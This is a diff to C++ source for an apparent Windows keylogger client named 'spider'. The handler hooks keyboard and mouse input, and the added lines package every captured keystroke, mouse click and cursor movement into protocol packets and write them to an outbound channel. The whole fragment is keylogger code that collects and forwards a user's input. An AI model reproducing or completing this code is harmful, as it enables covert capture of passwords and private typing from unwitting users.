@@ -1,4 +1,5 @@
 #include "client/WindowsInputHandler.hpp"
+#include "spider/packetSerializer.hpp"
 #include "spider/protocol.hpp"
 #include <iostream>
 #include <string.h>
@@ -130,10 +131,10 @@ namespace spider
 							buffer[0] = altedSymbols[std::distance(normalSymbols, index)];
 					}
 				}
-
 				strncpy(keyStruct->id, buffer, 30);
-				// TODO: Send struct to input queue
 				std::cout << hookedKey.time << " key = " << keyStruct->id  << std::endl;
+				tutu.write<PackageCMDKeyboardTouch>(spider::PacketSerializer<PackageCMDKeyboardTouch>(
+					sizeof(PackageHeader) + sizeof(PackageCMDKeyboardTouch), 666, *keyStruct));
 			}
 		}
 		else if ((wParam == WM_SYSKEYUP) || (wParam == WM_KEYUP))
@@ -165,6 +166,8 @@ namespace spider
 			mouseClic->x = p.x;
 			mouseClic->y = p.y;
 			// TODO: Send to input queue
+			tutu.write<PackageCMDMouseClic>(spider::PacketSerializer<PackageCMDMouseClic>(
+				sizeof(PackageHeader) + sizeof(PackageCMDMouseClic), 666, *mouseClic));
 			//std::cout << " Right click ";
 		}
 		else
@@ -174,6 +177,8 @@ namespace spider
 			mouseMove->x = p.x;
 			mouseMove->y = p.y;
 			// TODO: Send to input queue
+			tutu.write<PackageCMDMouseMove>(spider::PacketSerializer<PackageCMDMouseMove>(
+				sizeof(PackageHeader) + sizeof(PackageCMDMouseMove), 666, *mouseMove));
 			//std::cout << " Movement ";
 		}
 		//std::cout << "x = " << p.x << " y = " << p.y << std::endl;
